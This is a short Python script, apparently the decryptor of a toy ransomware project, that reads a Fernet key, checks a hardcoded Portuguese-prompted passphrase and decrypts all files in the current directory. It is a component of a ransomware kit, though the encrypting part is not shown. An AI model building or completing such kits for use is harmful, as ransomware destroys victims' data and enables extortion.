#!/usr/bin/env python 3

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
	if file == "malware.py" or file == "key.key" or file == "decrypt.py" or file == "malware" or file == "malware.spec":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("key.key" , "rb") as key:
	secretkey = key.read()
passphrase = "Chapolin"
upassword = input("Coloque a senha pra descriptografia: ")
if upassword == passphrase:
	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		content_decrypt = Fernet(secretkey).decrypt(content)
		with open(file, "wb")  as thefile:
			thefile.write(content_decrypt)
		print("Seus arquivos foram restaurados")
else:
	print("Coloque uma senha valida")
